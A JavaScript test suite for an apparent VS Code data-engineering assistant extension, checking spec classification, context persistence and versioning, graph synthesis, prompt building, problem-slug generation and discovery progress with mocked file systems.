    const base = { id: 'b', version: 1, status: 'approved', problemStatement: '', objectives: [], successCriteria: [], scope: { in: [], out: [] }, constraints: [], assumptions: [], createdAt: '', updatedAt: '' };

    const brownfield = classifyImplementationType({ ...base, problemStatement: 'Migrate our existing legacy warehouse, replacing the current system.' });
    assert.strictEqual(brownfield.implementationType, 'brownfield');

    const greenfield = classifyImplementationType({ ...base, problemStatement: 'Build a brand new analytics platform from scratch.' });
    assert.strictEqual(greenfield.implementationType, 'greenfield');

    const unspecified = classifyImplementationType({ ...base, problemStatement: 'Load daily sales events into a curated model.' });
    assert.strictEqual(unspecified.implementationType, 'greenfield');
    assert.ok(/defaulted to greenfield/i.test(unspecified.reason));

    const mixed = classifyImplementationType({ ...base, problemStatement: 'Build a brand new reporting layer on our existing legacy warehouse.' });
    assert.strictEqual(mixed.implementationType, 'brownfield');
    assert.ok(/mixed evidence/i.test(mixed.reason));
  });

  await test('buildTargetContextQuestions() suggests defaults from spec text and flags when nothing matched', () => {
    const { buildTargetContextQuestions } = require('../dist/core/targetContextQuestions.js');
    const base = { id: 'b', version: 1, status: 'approved', problemStatement: '', objectives: [], successCriteria: [], scope: { in: [], out: [] }, constraints: [], assumptions: [], createdAt: '', updatedAt: '' };

    const withHints = buildTargetContextQuestions({ ...base, problemStatement: 'Build a dbt project on Databricks using a data vault model, orchestrated with Dagster.' });
    const platformQ = withHints.find((q) => q.id === 'platform');
    const modelingQ = withHints.find((q) => q.id === 'modelingApproach');
    const orchestrationQ = withHints.find((q) => q.id === 'orchestrationTool');
    assert.strictEqual(platformQ.suggestedDefault, 'databricks');
    assert.ok(/mentions "databricks"/.test(platformQ.rationale));
    assert.strictEqual(modelingQ.suggestedDefault, 'data-vault');
    assert.strictEqual(orchestrationQ.suggestedDefault, 'dagster');

    const noHints = buildTargetContextQuestions(base);
    const platformNone = noHints.find((q) => q.id === 'platform');
    assert.strictEqual(platformNone.suggestedDefault, 'snowflake', 'falls back to a sensible default rather than leaving the field blank');
    assert.ok(/not mentioned/i.test(platformNone.rationale), 'is explicit that this is a default, not evidence, so the user knows to check it');
  });

  await test('buildSourceContextQuestions() suggests a source type from the spec catalog and text', () => {
    const { buildSourceContextQuestions } = require('../dist/core/sourceContextQuestions.js');
    const spec = {
      id: 'b', version: 1, status: 'approved', problemStatement: 'Ingest events from a Kafka stream.',
      objectives: [], successCriteria: [], scope: { in: [], out: [] }, constraints: [], assumptions: [], createdAt: '', updatedAt: '',
      sourceCatalog: [{ name: 'orders_db', type: 'database' }]
    };
    const questions = buildSourceContextQuestions(spec);
    const typeQ = questions.find((q) => q.id === 'sourceType');
    assert.strictEqual(typeQ.suggestedDefault, 'stream', 'keyword evidence ("Kafka stream") wins over the catalog default');
    assert.ok(/orders_db/.test(questions.find((q) => q.id === 'description').rationale), 'the description question references what the spec already cataloged');
  });

  await test('TargetContextManager persists, round-trips, and tracks approval per spec version', async () => {
    function fsMapMock() {
      const store = new Map();
      const keyOf = (uri) => (uri && uri.fsPath) ? uri.fsPath : String(uri);
      return {
        Uri: { file: (p) => ({ fsPath: p }), joinPath: (...parts) => ({ fsPath: parts.map((p) => (p && p.fsPath) ? p.fsPath : String(p)).join('/') }) },
        workspace: { fs: {
          createDirectory: async () => {},
          readFile: async (uri) => { const v = store.get(keyOf(uri)); if (v === undefined) throw new Error('ENOENT'); return Buffer.from(v, 'utf8'); },
          writeFile: async (uri, buf) => { store.set(keyOf(uri), buf.toString('utf8')); },
          rename: async (a, b) => { store.set(keyOf(b), store.get(keyOf(a))); store.delete(keyOf(a)); }
        } }
      };
    }
    const mock = fsMapMock();
    try { delete require.cache[require.resolve('../dist/context/TargetContextManager.js')]; } catch { /* not loaded */ }
    const { TargetContextManager } = withMock(mock, () => require('../dist/context/TargetContextManager.js'));
    const mgr = new TargetContextManager({ fsPath: '/ws' }, () => {});
    await withMock(mock, () => mgr.initialize());
    assert.strictEqual(mgr.getContext(), undefined);

    await withMock(mock, () => mgr.reset('bps-1', 1));
    assert.strictEqual(mgr.getContext().status, 'pending');
    assert.strictEqual(mgr.isApprovedFor('bps-1', 1), false);

    await withMock(mock, () => mgr.save({ specId: 'bps-1', specVersion: 1, status: 'built', platform: 'snowflake', modelingApproach: 'dimensional', answers: { platform: 'snowflake' } }));
    assert.strictEqual(mgr.isApprovedFor('bps-1', 1), false, 'built is not yet approved');

    await withMock(mock, () => mgr.save({ specId: 'bps-1', specVersion: 1, status: 'approved', platform: 'snowflake', modelingApproach: 'dimensional', answers: { platform: 'snowflake' } }));
    assert.strictEqual(mgr.isApprovedFor('bps-1', 1), true);
    assert.strictEqual(mgr.isApprovedFor('bps-1', 2), false, 'a new spec version invalidates the old approval');

    const mgr2 = new TargetContextManager({ fsPath: '/ws' }, () => {});
    await withMock(mock, () => mgr2.initialize());
    assert.strictEqual(mgr2.getContext().status, 'approved', 'reloads the persisted record');
  });

  await test('SourceContextManager tracks Not Applicable (Greenfield) vs. built/approved (Brownfield) readiness', async () => {
    function fsMapMock() {
      const store = new Map();
      const keyOf = (uri) => (uri && uri.fsPath) ? uri.fsPath : String(uri);
      return {
        Uri: { file: (p) => ({ fsPath: p }), joinPath: (...parts) => ({ fsPath: parts.map((p) => (p && p.fsPath) ? p.fsPath : String(p)).join('/') }) },
        workspace: { fs: {
          createDirectory: async () => {},
          readFile: async (uri) => { const v = store.get(keyOf(uri)); if (v === undefined) throw new Error('ENOENT'); return Buffer.from(v, 'utf8'); },
          writeFile: async (uri, buf) => { store.set(keyOf(uri), buf.toString('utf8')); },
          rename: async (a, b) => { store.set(keyOf(b), store.get(keyOf(a))); store.delete(keyOf(a)); }
        } }
      };
    }
    const mock = fsMapMock();
    try { delete require.cache[require.resolve('../dist/context/SourceContextManager.js')]; } catch { /* not loaded */ }
    const { SourceContextManager } = withMock(mock, () => require('../dist/context/SourceContextManager.js'));
    const mgr = new SourceContextManager({ fsPath: '/ws' }, () => {});
    await withMock(mock, () => mgr.initialize());

    await withMock(mock, () => mgr.markNotApplicable('bps-1', 1));
    assert.strictEqual(mgr.getContext().status, 'not_applicable');
    assert.strictEqual(mgr.isReadyFor('bps-1', 1), true, 'Not Applicable already satisfies the gate — Greenfield needs no further action');

    await withMock(mock, () => mgr.reset('bps-1', 2));
    assert.strictEqual(mgr.isReadyFor('bps-1', 2), false, 'freshly reset (Brownfield) is not ready until built + approved');
    const entry = { connectionId: 'described', method: 'described', description: 'A Postgres orders database.' };
    await withMock(mock, () => mgr.save({ specId: 'bps-1', specVersion: 2, status: 'built', sources: [entry], answers: {} }));
    assert.strictEqual(mgr.isReadyFor('bps-1', 2), false, 'built is not yet approved');
    await withMock(mock, () => mgr.save({ specId: 'bps-1', specVersion: 2, status: 'approved', sources: [entry], answers: {} }));
    assert.strictEqual(mgr.isReadyFor('bps-1', 2), true);
  });

  await test('SourceContextManager round-trips the sources[] entry list through a real save+reload, including connectionId', async () => {
    function fsMapMock() {
      const store = new Map();
      const keyOf = (uri) => (uri && uri.fsPath) ? uri.fsPath : String(uri);
      return {
        Uri: { file: (p) => ({ fsPath: p }), joinPath: (...parts) => ({ fsPath: parts.map((p) => (p && p.fsPath) ? p.fsPath : String(p)).join('/') }) },
        workspace: { fs: {
          createDirectory: async () => {},
          readFile: async (uri) => { const v = store.get(keyOf(uri)); if (v === undefined) throw new Error('ENOENT'); return Buffer.from(v, 'utf8'); },
          writeFile: async (uri, buf) => { store.set(keyOf(uri), buf.toString('utf8')); },
          rename: async (a, b) => { store.set(keyOf(b), store.get(keyOf(a))); store.delete(keyOf(a)); }
        } }
      };
    }
    const mock = fsMapMock();
    try { delete require.cache[require.resolve('../dist/context/SourceContextManager.js')]; } catch { /* not loaded */ }
    const { SourceContextManager } = withMock(mock, () => require('../dist/context/SourceContextManager.js'));
    const mgr = new SourceContextManager({ fsPath: '/ws' }, () => {});
    await withMock(mock, () => mgr.initialize());
    await withMock(mock, () => mgr.save({
      specId: 'bps-1', specVersion: 1, status: 'built',
      sources: [{ connectionId: 'snowflake:prod', platform: 'snowflake', method: 'connected', connectionSummary: { database: 'RAW_DB', schema: 'PUBLIC', tableCount: 12, viewCount: 3 }, extractedAt: 't1' }],
      answers: {}
    }));

    // Fresh manager instance forces a real reload from the serialized file.
    const mgr2 = new SourceContextManager({ fsPath: '/ws' }, () => {});
    await withMock(mock, () => mgr2.initialize());
    const reloaded = mgr2.getContext();
    assert.strictEqual(reloaded.sources.length, 1);
    assert.strictEqual(reloaded.sources[0].connectionId, 'snowflake:prod');
    assert.strictEqual(reloaded.sources[0].connectionSummary.tableCount, 12);
  });

  await test('SourceContextManager bumps version + archives only when revising an already-approved predecessor of the same spec lineage — not on approving a draft, and never twice for the same revision', async () => {
    function fsMapMock() {
      const store = new Map();
      const keyOf = (uri) => (uri && uri.fsPath) ? uri.fsPath : String(uri);
      return {
        Uri: { file: (p) => ({ fsPath: p }), joinPath: (...parts) => ({ fsPath: parts.map((p) => (p && p.fsPath) ? p.fsPath : String(p)).join('/') }) },
        workspace: { fs: {
          createDirectory: async () => {},
          readFile: async (uri) => { const v = store.get(keyOf(uri)); if (v === undefined) throw new Error('ENOENT'); return Buffer.from(v, 'utf8'); },
          writeFile: async (uri, buf) => { store.set(keyOf(uri), buf.toString('utf8')); },
          rename: async (a, b) => { store.set(keyOf(b), store.get(keyOf(a))); store.delete(keyOf(a)); },
          stat: async (uri) => { if (!store.has(keyOf(uri))) throw new Error('ENOENT'); return {}; }
        } },
        store
      };
    }
    const mock = fsMapMock();
    try { delete require.cache[require.resolve('../dist/context/SourceContextManager.js')]; } catch { /* not loaded */ }
    const { SourceContextManager } = withMock(mock, () => require('../dist/context/SourceContextManager.js'));
    const mgr = new SourceContextManager({ fsPath: '/ws' }, () => {});
    await withMock(mock, () => mgr.initialize());

    // built -> approved on the same lineage: never bumps ("a draft v1 becomes an approved v1").
    await withMock(mock, () => mgr.save({ specId: 'bps-1', specVersion: 1, status: 'built', sources: [{ connectionId: 'described', method: 'described', description: 'v1 desc' }], answers: {} }));
    assert.strictEqual(mgr.getContext().version, 1);
    await withMock(mock, () => mgr.save({ ...mgr.getContext(), status: 'approved' }));
    assert.strictEqual(mgr.getContext().version, 1, 'approving a not-yet-approved record must not bump the version');
    assert.strictEqual(mock.store.has('/ws/context/history/source-context.spec1.v1.yaml'), false, 'nothing archived yet — no revision has happened');

    // Revising the now-approved v1 (same specId/specVersion, new content) bumps to v2 and archives v1.
    await withMock(mock, () => mgr.save({ specId: 'bps-1', specVersion: 1, status: 'built', sources: [{ connectionId: 'described', method: 'described', description: 'v2 desc' }], answers: {} }));
    assert.strictEqual(mgr.getContext().version, 2, 'revising an approved predecessor bumps the version');
    assert.strictEqual(mock.store.has('/ws/context/history/source-context.spec1.v1.yaml'), true, 'the approved v1 predecessor was archived before being overwritten');

    // A different spec lineage (new specVersion) starts fresh at v1, but the
    // approved v2 being replaced is still archived, not silently discarded.
    await withMock(mock, () => mgr.save({ ...mgr.getContext(), status: 'approved' }));
    await withMock(mock, () => mgr.save({ specId: 'bps-1', specVersion: 2, status: 'pending', sources: [], answers: {} }));
    assert.strictEqual(mgr.getContext().version, 1, 'a new spec lineage starts its own version count at 1');
    assert.strictEqual(mock.store.has('/ws/context/history/source-context.spec1.v2.yaml'), true, 'the approved v2 (spec v1 lineage) was archived before spec v2 lineage started fresh');
  });

  await test('SourceContextManager migrates a pre-v0.19.0 flat-shape source-context.yaml (method/connectionSummary at the document root) into sources[]', async () => {
    function fsMapMock(initialFile) {
      const store = new Map([['/ws/context/source-context.yaml', initialFile]]);
      const keyOf = (uri) => (uri && uri.fsPath) ? uri.fsPath : String(uri);
      return {
        Uri: { file: (p) => ({ fsPath: p }), joinPath: (...parts) => ({ fsPath: parts.map((p) => (p && p.fsPath) ? p.fsPath : String(p)).join('/') }) },
        workspace: { fs: {
          createDirectory: async () => {},
          readFile: async (uri) => { const v = store.get(keyOf(uri)); if (v === undefined) throw new Error('ENOENT'); return Buffer.from(v, 'utf8'); },
          writeFile: async (uri, buf) => { store.set(keyOf(uri), buf.toString('utf8')); },
          rename: async (a, b) => { store.set(keyOf(b), store.get(keyOf(a))); store.delete(keyOf(a)); }
        } }
      };
    }
    const legacyYaml = [
      'specId: bps-legacy',
      'specVersion: 1',
      'status: approved',
      'method: connected',
      'connectionSummary:',
      '  platform: snowflake',
      '  database: RAW_DB',
      '  schema: PUBLIC',
      '  tableCount: 5',
      '  viewCount: 1',
      'answers: {}'
    ].join('\n') + '\n';
    const mock = fsMapMock(legacyYaml);
    try { delete require.cache[require.resolve('../dist/context/SourceContextManager.js')]; } catch { /* not loaded */ }
    const { SourceContextManager } = withMock(mock, () => require('../dist/context/SourceContextManager.js'));
    const mgr = new SourceContextManager({ fsPath: '/ws' }, () => {});
    await withMock(mock, () => mgr.initialize());
    const ctx = mgr.getContext();
    assert.strictEqual(ctx.sources.length, 1, 'legacy flat shape migrates into a single sources[] entry');
    assert.strictEqual(ctx.sources[0].method, 'connected');
    assert.strictEqual(ctx.sources[0].platform, 'snowflake');
    assert.strictEqual(ctx.sources[0].connectionSummary.tableCount, 5);
  });

  await test('SynthesisPipeline.synthesizeFromSpec() derives graph nodes with spec provenance and re-syncs cleanly', async () => {
    const mock = createMock();
    for (const p of ['../dist/context/GraphManager.js', '../dist/context/SynthesisPipeline.js']) {
      try { delete require.cache[require.resolve(p)]; } catch { /* not loaded */ }
    }
    const { GraphManager } = withMock(mock, () => require('../dist/context/GraphManager.js'));
    const { SynthesisPipeline } = withMock(mock, () => require('../dist/context/SynthesisPipeline.js'));
    const graph = new GraphManager();
    const pipeline = new SynthesisPipeline({ fsPath: '/ws' }, graph, () => {});

    const specV1 = {
      id: 'bps-1', version: 1, status: 'approved',
      problemStatement: 'p', objectives: ['Reduce reporting latency'], successCriteria: [],
      scope: { in: [], out: [] }, constraints: ['Must use existing Snowflake account'],
      assumptions: ['Source data arrives daily'], createdAt: '', updatedAt: ''
    };
    const result1 = await withMock(mock, () => pipeline.synthesizeFromSpec(specV1));
    assert.strictEqual(result1.nodes, 3, '1 objective + 1 constraint + 1 assumption');
    const terms = graph.getNodesByType('business_term');
    assert.strictEqual(terms.length, 1);
    assert.strictEqual(terms[0].origin.specId, 'bps-1');
    assert.strictEqual(terms[0].origin.specVersion, 1);
    const rules = graph.getNodesByType('business_rule');
    assert.strictEqual(rules.length, 2);
    const strict = rules.find((r) => r.enforcementLevel === 'STRICT');
    assert.ok(strict && /existing Snowflake account/.test(strict.ruleText));

    // Re-synthesizing from a later version replaces v1's nodes rather than accumulating them.
    const specV2 = Object.assign({}, specV1, { version: 2, objectives: ['Reduce reporting latency', 'Add self-serve dashboards'] });
    const result2 = await withMock(mock, () => pipeline.synthesizeFromSpec(specV2));
    assert.strictEqual(result2.nodes, 4, '2 objectives + 1 constraint + 1 assumption');
    const termsAfter = graph.getNodesByType('business_term');
    assert.strictEqual(termsAfter.length, 2, 'v1 objective node was replaced, not duplicated alongside v2');
    assert.ok(termsAfter.every((t) => t.origin.specVersion === 2));
  });

  await test('ContextFileManager.getContextStats() counts source-environment-tagged nodes', async () => {
    const mock = createMock();
    for (const p of ['../dist/context/GraphManager.js', '../dist/context/ContextFileManager.js']) {
      try { delete require.cache[require.resolve(p)]; } catch { /* not loaded */ }
    }
    const { GraphManager } = withMock(mock, () => require('../dist/context/GraphManager.js'));
    const { ContextFileManager } = withMock(mock, () => require('../dist/context/ContextFileManager.js'));
    const graph = new GraphManager();
    const cfm = new ContextFileManager({ fsPath: '/ws' }, graph, () => {});

    await withMock(mock, () => graph.addNode({
      id: 'table-src', type: 'table', label: 'orders', database: 'db', schema: 's', fqn: 'db.s.orders', isView: false,
      metadata: {}, version: 1, origin: { source: 'derived', sourceRef: 'snowflake', extractor: 'source-assessment', extractedAt: 't', environment: 'source' }
    }));
    await withMock(mock, () => graph.addNode({
      id: 'term-objective', type: 'business_term', label: 'Reduce latency', metadata: {}, version: 1, mappedNodeIds: [],
      origin: { source: 'derived', sourceRef: 'spec:bps-1', extractor: 'spec-sync', extractedAt: 't' } // no environment tag — spec-level, not source/target
    }));
    await withMock(mock, () => graph.addNode({
      id: 'rule-contract', type: 'business_rule', label: 'Must match data contract', ruleText: 'x', enforcementLevel: 'STRICT',
      metadata: {}, version: 1, origin: { source: 'derived', sourceRef: 'docs/contract.md', extractor: 'synthesis-pipeline', extractedAt: 't', environment: 'source' }
    }));

    const stats = cfm.getContextStats();
    assert.strictEqual(stats.sourceEnvironmentNodes, 2, 'the table and the registered data-contract rule are source-tagged; the spec-derived term is not');
  });

  await test('ContextFileManager.setRuntimeFact()/buildContextPrompt() renders ephemeral session facts, and clears cleanly', async () => {
    const mock = createMock();
    for (const p of ['../dist/context/GraphManager.js', '../dist/context/ContextFileManager.js']) {
      try { delete require.cache[require.resolve(p)]; } catch { /* not loaded */ }
    }
    const { GraphManager } = withMock(mock, () => require('../dist/context/GraphManager.js'));
    const { ContextFileManager } = withMock(mock, () => require('../dist/context/ContextFileManager.js'));
    const graph = new GraphManager();
    const cfm = new ContextFileManager({ fsPath: '/ws' }, graph, () => {});

    // No facts, no graph content at all: no section, not even an empty heading.
    assert.strictEqual(cfm.buildContextPrompt(), '');

    cfm.setRuntimeFact('connection:source', { label: 'Source Connection', text: 'Connected to snowflake (RAW_DB.PUBLIC).' });
    const withFact = cfm.buildContextPrompt();
    assert.ok(withFact.includes('## Live Session Facts'));
    assert.ok(withFact.includes('Source Connection'));
    assert.ok(withFact.includes('Connected to snowflake'));

    cfm.setRuntimeFact('connection:target', { label: 'Target Connection', text: 'Connected to databricks (main.default).' });
    const withBoth = cfm.buildContextPrompt();
    assert.ok(withBoth.includes('Source Connection') && withBoth.includes('Target Connection'), 'both roles render independently, keyed separately');

    cfm.setRuntimeFact('connection:source', null);
    const afterClear = cfm.buildContextPrompt();
    assert.ok(!afterClear.includes('Source Connection'), 'clearing one fact removes only that one');
    assert.ok(afterClear.includes('Target Connection'), 'the other fact survives');
  });

  await test('AgentHub.generateSpec() now includes a passed-in context block in its prompt (previously always zero context, not even repository context)', async () => {
    const validSpecJson = JSON.stringify({ problemStatement: 'Load sales into a mart', objectives: ['a'], scope: { in: ['a'] } });
    let capturedUserContent = '';
    const model = {
      id: 'copilot-4o', family: 'gpt-4o', vendor: 'copilot', version: '1', name: 'Copilot-4o', maxInputTokens: 128000,
      sendRequest: async (msgs) => {
        const userMsg = msgs.find((m) => m.role === 1);
        capturedUserContent = userMsg ? userMsg.content : '';
        return { text: textIter(validSpecJson) };
      }
    };
    const mock = createMock({ models: [model] });
    delete require.cache[require.resolve('../dist/core/agentHub.js')];
    clearAdapterCache();
    const { DataAgentHubHub } = withMock(mock, () => require('../dist/core/agentHub.js'));
    const hub = new DataAgentHubHub(fakeCm({ activeLlmProvider: 'copilot', activeLlmModel: 'x', languageModelProgrammaticConsent: true, defaultProvider: 'snowflake' }));

    await withMock(mock, () => hub.generateSpec('We need a sales mart', undefined, '## Live Session Facts\n- **Source Connection**: Connected to snowflake (RAW_DB.PUBLIC).'));
    assert.ok(capturedUserContent.includes('Live Session Facts'), 'the context block reaches the actual LLM prompt');
    assert.ok(capturedUserContent.includes('Source Connection'));

    // Backward-compatible: context is optional, omitting it doesn't break the call.
    capturedUserContent = '';
    await withMock(mock, () => hub.generateSpec('We need a sales mart'));
    assert.ok(!capturedUserContent.includes('Live Session Facts'));
  });

  await test('ArtifactWriter archives the previous revision to history/ before overwriting', async () => {
    const os = require('node:os');
    const path = require('node:path');
    const fs = require('node:fs');
    const tmpRoot = fs.mkdtempSync(path.join(os.tmpdir(), 'autode-artifact-history-'));
    const problemDir = path.join(tmpRoot, '.autode', 'problems', 'p1');
    const workspaceRoot = { fsPath: problemDir, toString: () => problemDir };
    const mock = createMock();
    mock.workspace.fs.createDirectory = async (uri) => { fs.mkdirSync(uri.fsPath, { recursive: true }); };
    mock.workspace.fs.writeFile = async (uri, buf) => { fs.writeFileSync(uri.fsPath, buf); };
    mock.workspace.fs.rename = async (a, b) => { fs.renameSync(a.fsPath, b.fsPath); };
    mock.workspace.fs.readFile = async (uri) => {
      try { return fs.readFileSync(uri.fsPath); } catch { throw new Error('ENOENT'); }
    };

    try { delete require.cache[require.resolve('../dist/context/ArtifactWriter.js')]; } catch { /* not loaded */ }
    const { ArtifactWriter } = withMock(mock, () => require('../dist/context/ArtifactWriter.js'));
    const writer = new ArtifactWriter(workspaceRoot, () => {});
    const artifact = (content) => ({
      id: 'ddl-1', type: 'ddl', title: 'ddl-1', description: '', content, language: 'sql',
      generatedBy: 'dataModelerAgent', generatedAt: 't', approved: false, phase: 'build', specId: 'bps-1', specVersion: 1
    });

    await withMock(mock, () => writer.write(artifact('select 1')));
    await withMock(mock, () => writer.write(artifact('select 2 -- rerun')));

    const targetPath = path.join(tmpRoot, 'autode-output', 'p1', '03-build', 'bps-1.v1', 'ddl-1.sql');
    assert.strictEqual(fs.readFileSync(targetPath, 'utf8'), 'select 2 -- rerun', 'the file itself reflects the latest rerun');

    const historyDir = path.join(tmpRoot, 'autode-output', 'p1', '03-build', 'bps-1.v1', 'history');
    const historyFiles = fs.readdirSync(historyDir);
    assert.strictEqual(historyFiles.length, 1, 'exactly one prior revision archived');
    assert.ok(historyFiles[0].endsWith('.ddl-1.sql'), historyFiles[0]);
    assert.strictEqual(fs.readFileSync(path.join(historyDir, historyFiles[0]), 'utf8'), 'select 1', 'the archived copy is the original content');

    fs.rmSync(tmpRoot, { recursive: true, force: true });
  });

  // ── Multi-business-problem workspace (v0.12.0) ──
  await test('generateProblemSlug() filters stop-words, truncates, and falls back for an empty statement', () => {
    const { generateProblemSlug } = require('../dist/core/problemSlug.js');
    const slug = generateProblemSlug('We need to reduce checkout latency for mobile users');
    assert.ok(/^reduce-checkout-latency-mobile-users-[a-z0-9]{4}$/.test(slug), slug);

    const empty = generateProblemSlug('');
    assert.ok(/^business-problem-[a-z0-9]{4}$/.test(empty), empty);

    const long = generateProblemSlug('This one two three four five six seven eight nine ten eleven twelve');
    // Only the first 5 non-stop-words are kept.
    assert.ok(long.startsWith('one-two-three-four-five-'), long);
  });

  await test('generateProblemSlug() never returns a slug already present in existingSlugs', () => {
    const { generateProblemSlug } = require('../dist/core/problemSlug.js');
    const origRandom = Math.random;
    // First call: RNG yields 0.111111 once -> some suffix S1.
    // Second call (with existingSlugs=[first]): RNG repeats 0.111111 for the
    // initial candidate (reproducing S1, an intentional collision), then
    // yields 0.222222 on retry -> must produce a different suffix.
    const queue = [0.111111, 0.111111, 0.222222];
    let idx = 0;
    Math.random = () => queue[Math.min(idx++, queue.length - 1)];
    try {
      const first = generateProblemSlug('Reduce checkout latency for mobile users');
      const second = generateProblemSlug('Reduce checkout latency for mobile users', [first]);
      assert.notStrictEqual(second, first, 'must retry rather than return a colliding slug');
    } finally {
      Math.random = origRandom;
    }
  });

  await test('ActiveProblemManager round-trips the active-problem pointer and lists problem summaries', async () => {
    const os = require('node:os');
    const path = require('node:path');
    const fs = require('node:fs');
    const tmpRoot = fs.mkdtempSync(path.join(os.tmpdir(), 'autode-active-problem-'));
    const workspaceUri = { fsPath: tmpRoot, toString: () => tmpRoot };

    const mock = createMock();
    mock.workspace.fs.createDirectory = async (uri) => { fs.mkdirSync(uri.fsPath, { recursive: true }); };
    mock.workspace.fs.writeFile = async (uri, buf) => { fs.writeFileSync(uri.fsPath, buf); };
    mock.workspace.fs.rename = async (a, b) => { fs.renameSync(a.fsPath, b.fsPath); };
    mock.workspace.fs.readFile = async (uri) => { try { return fs.readFileSync(uri.fsPath); } catch { throw new Error('ENOENT'); } };
    mock.workspace.fs.delete = async (uri) => { try { fs.unlinkSync(uri.fsPath); } catch { /* already absent */ } };

    delete require.cache[require.resolve('../dist/context/ActiveProblemManager.js')];
    const { ActiveProblemManager } = withMock(mock, () => require('../dist/context/ActiveProblemManager.js'));
    const mgr = new ActiveProblemManager(workspaceUri, () => {});

    assert.strictEqual(await withMock(mock, () => mgr.getActiveProblemId()), undefined, 'no pointer yet');

    await withMock(mock, () => mgr.setActiveProblemId('problem-a'));
    assert.strictEqual(await withMock(mock, () => mgr.getActiveProblemId()), 'problem-a');

    // Seed two problem folders directly on disk.
    const seedSpec = (id, statement, status, updatedAt) => {
      const specDir = path.join(tmpRoot, '.autode', 'problems', id, 'spec');
      fs.mkdirSync(specDir, { recursive: true });
      const yaml = [
        `id: ${id}`, 'version: 1', `status: ${status}`, `problemStatement: ${statement}`,
        `updatedAt: ${updatedAt}`
      ].join('\n') + '\n';
      fs.writeFileSync(path.join(specDir, 'business-problem.yaml'), yaml);
    };
    seedSpec('problem-a', 'Older problem', 'approved', '2026-01-01T00:00:00.000Z');
    seedSpec('problem-b', 'Newer problem', 'draft', '2026-02-01T00:00:00.000Z');
    // A folder with no readable spec yet must be skipped, not throw.
    fs.mkdirSync(path.join(tmpRoot, '.autode', 'problems', 'problem-c', 'spec'), { recursive: true });

    const problems = await withMock(mock, () => mgr.listProblems());
    assert.strictEqual(problems.length, 2, 'the unreadable folder is skipped');
    assert.strictEqual(problems[0].id, 'problem-b', 'sorted by updatedAt descending');
    assert.strictEqual(problems[0].status, 'draft');
    assert.strictEqual(problems[1].id, 'problem-a');
    assert.strictEqual(problems[1].isActive, true, 'matches the active pointer');
    assert.strictEqual(problems[0].isActive, false);

    await withMock(mock, () => mgr.clearActiveProblem());
    assert.strictEqual(await withMock(mock, () => mgr.getActiveProblemId()), undefined);

    fs.rmSync(tmpRoot, { recursive: true, force: true });
  });

  await test('resetForNewProblem() clears spec identity and the target, so nothing leaks into the next business problem', () => {
    const { hub } = hubWithResponse('irrelevant');
    hub.setSpec('bps-old', 3);
    hub.setTargetEnvironment({ platform: 'snowflake', environmentProfile: 'development', modelingApproach: 'dimensional', transformationTool: 'dbt', orchestrationTool: 'airflow', outputFormats: [], platformConfig: {} });
    assert.strictEqual(hub.currentSpecId(), 'bps-old');
    hub.resetForNewProblem();
    assert.strictEqual(hub.currentSpecId(), undefined, 'spec identity must not leak into the next business problem');
    assert.strictEqual(hub.getTargetEnvironment(), undefined, 'target environment must not leak');
  });

  // ── Lifecycle Orchestration (v0.13.0) — requirements.md §8.12 ──

  await test('SpecManager round-trips implementationType and problemStatementApproved', async () => {
    function mockFs() {
      const store = new Map();
      const keyOf = (uri) => (uri && uri.fsPath) ? uri.fsPath : String(uri);
      return {
        Uri: {
          file: (p) => ({ fsPath: p }),
          joinPath: (...parts) => ({ fsPath: parts.map((p) => (p && p.fsPath) ? p.fsPath : String(p)).join('/') })
        },
        workspace: {
          fs: {
            createDirectory: async () => {},
            readFile: async (uri) => { const v = store.get(keyOf(uri)); if (!v) throw new Error('ENOENT'); return Buffer.from(v, 'utf8'); },
            writeFile: async (uri, buf) => { store.set(keyOf(uri), buf.toString('utf8')); },
            rename: async (a, b) => { store.set(keyOf(b), store.get(keyOf(a))); store.delete(keyOf(a)); },
            stat: async () => { throw new Error('ENOENT'); }
          }
        }
      };
    }
    const mock = mockFs();
    delete require.cache[require.resolve('../dist/context/SpecManager.js')];
    const { SpecManager } = withMock(mock, () => require('../dist/context/SpecManager.js'));
    const mgr = new SpecManager({ fsPath: '/ws/.autode/problems/p1' }, () => {});
    await withMock(mock, () => mgr.initialize());
    const spec = {
      id: 'bps-1', version: 1, status: 'draft', problemStatement: 'p', objectives: ['o'], successCriteria: [],
      scope: { in: ['a'], out: [] }, constraints: [], assumptions: [], domain: 'd', stakeholders: [], keyEntities: [],
      createdAt: 'c', updatedAt: 'u',
      implementationType: 'brownfield', implementationTypeReason: 'Manually set by user.', implementationTypeOverridden: true,
      problemStatementApproved: true
    };
    await withMock(mock, () => mgr.saveSpec(spec));
    const mgr2 = new SpecManager({ fsPath: '/ws/.autode/problems/p1' }, () => {});
    await withMock(mock, () => mgr2.initialize());
    const loaded = mgr2.getSpec();
    assert.strictEqual(loaded.implementationType, 'brownfield', 'implementationType now round-trips (previously silently dropped)');
    assert.strictEqual(loaded.implementationTypeReason, 'Manually set by user.');
    assert.strictEqual(loaded.implementationTypeOverridden, true);
    assert.strictEqual(loaded.problemStatementApproved, true);
  });

  // ── Discovery progress surfacing (follow-up to v0.13.0) ──
  await test('buildDiscoveryProgress() reports "addressed" only once every field a skill owns is at least partial', () => {
    const mock = createMock();
    const { buildDiscoveryProgress } = withMock(mock, () => require('../dist/core/discoveryProgress.js'));
    const skills = [
      { id: 'requirements', name: 'Requirements Discovery', order: 1, description: '', systemPrompt: 'p', questionGuidance: '', specFields: ['objectives', 'successCriteria'] },
      { id: 'data-flow', name: 'Data Flow', order: 2, description: '', systemPrompt: 'p', questionGuidance: '', specFields: ['dataFlows'] },
      { id: 'synthesis', name: 'Synthesis', order: 3, description: '', systemPrompt: 'p', questionGuidance: '', specFields: [] }
    ];
    const session = {
      id: 's', problemStatement: 'p', state: 'discovery', questions: [], answers: [], insights: [],
      coverage: { objectives: 'partial', successCriteria: 'missing', dataFlows: 'partial' },
      turnCount: 3, turnBudget: 12, createdAt: '', updatedAt: ''
    };
    const progress = buildDiscoveryProgress(session, skills);
    assert.strictEqual(progress.turnCount, 3);
    assert.strictEqual(progress.turnBudget, 12);
    assert.strictEqual(progress.coveredFields, 2, 'objectives and dataFlows are not missing');
    assert.strictEqual(progress.totalFields, 3);
    assert.strictEqual(progress.skills.length, 2, 'the synthesis skill (no specFields) is excluded');
    const reqSkill = progress.skills.find((s) => s.id === 'requirements');
    assert.strictEqual(reqSkill.status, 'partial', 'objectives touched, successCriteria still missing');
    const flowSkill = progress.skills.find((s) => s.id === 'data-flow');
    assert.strictEqual(flowSkill.status, 'addressed', 'its one field is not missing');
  });

